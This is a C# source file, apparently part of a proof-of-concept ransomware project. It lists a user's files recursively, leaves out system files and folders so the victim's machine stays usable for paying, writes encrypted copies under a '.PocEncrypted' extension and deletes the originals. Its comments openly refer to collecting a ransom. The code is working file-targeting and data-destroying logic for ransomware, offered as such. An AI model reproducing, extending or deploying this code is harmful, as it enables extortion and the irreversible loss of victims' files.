using System;
using System.Collections.Generic;
using System.Text;
using System.IO;



namespace PocDecryptor
{

    public static class FileHandlingUtilities
    {




        private const string EncryptionDirectory = @"C:\Users\ilay";  //the directory for the encryption
        private const string DefaultEncryptionDirectory = @"C:\";   //optional-the directory to try encrypting when Privelage Escelation has failed

        public const string RansomWareExtension = ".PocEncrypted";  //the file extension of the ransomware

        private static readonly string[] FileExtensionsToAvoid = { RansomWareExtension, "DLL", ".log", ".msi", ".md", ".cs", ".bat", ".exe", ".dll", ".lnk", ".ini", ".zip", ".chm", ".EXE", ".sys", ".ntdll" };
        private const bool IsAggresiveMode = false;   //if sets true the ransomware wont ignore the system files below and will try to encrypt them
                                                      //this is huge risk and can destroy the system! you wont be able to get your ransom that way
                                                      //these are specific files that are part of the OS and shoudnt be touched. if you want to specify
                                                      //a directory and keep it safe from encryption you should mrntion that below:
        private static readonly string[] WindowsDirectoriesToAvoid = { "bios", "Temp", "boot.ini", "boot", "fodhelper.exe", "tmp", "cache", "system", "systemfiles", "windows", "SAM/Security", "x86" };

        private static List<string> AllFileSystem;         //contains list of all files paths to encrypt

        static FileHandlingUtilities()    //static ctor to set all static members
        {
            try
            {
                //Gets all files from the directory using try/ctach at each iteration
                var filePaths = Directory.EnumerateFiles(EncryptionDirectory, "*", new EnumerationOptions
                {
                    IgnoreInaccessible = true,
                    RecurseSubdirectories = true
                });
                AllFileSystem = new List<string>(filePaths);
                foreach (var file in AllFileSystem)
                {
                    Console.WriteLine(file);
                }
                ClearUnwantedExtensions();

            }
            catch
            {
                try
                {


                    Console.WriteLine("File collection using admin directory faled!, trying to use a user directoty...");
                    string[] AllFiles = (Directory.GetFiles(DefaultEncryptionDirectory, "*", SearchOption.AllDirectories));    //Gets all files from the directory
                    AllFileSystem = new List<string>(AllFiles);
                    ClearUnwantedExtensions();

                }
                catch
                {
                    Console.WriteLine("File collection failed");
                }

            }

        }

        private static void ClearUnwantedExtensions()    //Clears unvalid file extensions and directories
        {
            try
            {
                foreach (string Filename in AllFileSystem.ToArray())
                {
                    if (IsFileExtensionExists(Filename))
                    {
                        AllFileSystem.Remove(Filename);
                    }
                    if (IsDirectoryExists(Filename) && !IsAggresiveMode)
                    {
                        AllFileSystem.Remove(Filename);

                    }

                }

            }
            catch
            {
                Console.WriteLine("Error while analyzing database");
            }



        }

        public static bool IsDirectoryExists(string file)   //Checks if unwanted directory exists in a file path
        {
            try
            {
                foreach (string dir in WindowsDirectoriesToAvoid)
                {
                    if (file.Contains(dir))
                    {
                        return true;
                    }
                }
                return false;
            }
            catch
            {
                Console.WriteLine("An error while trying to look for unwanted directories");
                return false;
            }
        }




        private static bool IsFileExtensionExists(string Filename)      //Check Weather a file contains an unvailed file extension
        {
            try
            {
                foreach (string FileExtension in FileExtensionsToAvoid)
                {
                    if (Filename.Contains(FileExtension))
                    {
                        return true;
                    }

                }
                return false;
            }
            catch
            {
                return false;
            }
        }



        public static List<string> GetAllFileSystem()     //method that gets all the updated file names to encrypt
        {
            return AllFileSystem;

        }

        public static Byte[] GetsRawFileContent(string Directory)   //method for reading a file into Bytes.
                                                                    //the bytes will be passed into the encryption utilities
        {
            try
            {
                return File.ReadAllBytes(Directory);

            }
            catch
            {
                Console.WriteLine("An error while collectiong directory files");
                return null;
            }


        }



        public static void CreateFileForEncryption(string Directory, Byte[] EncryptedData)   //method that gets encrypted data and a file path and 
        {
            try
            {
                string EncDirectory = Directory + RansomWareExtension;

                using (FileStream FileHandler = File.Create(EncDirectory))
                {
                    FileHandler.Write(EncryptedData);
                    FileHandler.Close();




                }


            }
            catch
            {
                Console.WriteLine("An error while Creating file for encryption");
            }




        }



        public static void DeleteSourceFile(string Directory)   //deletes original file after creating an encrpted version of it
        {
            try
            {
                File.Delete(Directory);
            }
            catch
            {
                Console.WriteLine("Error while deleting a source file");
            }
        }



        public static void CreateOriginalFileForDecryption(string Directory, Byte[] DecryptedData)  //used to reverse the encryption and recreate original file
        {
            try
            {
                string OriginalDirectory = Directory.Split(RansomWareExtension)[0];

                using (FileStream FileData = File.Create(OriginalDirectory))
                {
                    FileData.Write(DecryptedData);
                    FileData.Close();



                }




            }
            catch
            {
                Console.WriteLine("An error while creating file for decryption");
            }
        }









    }
}
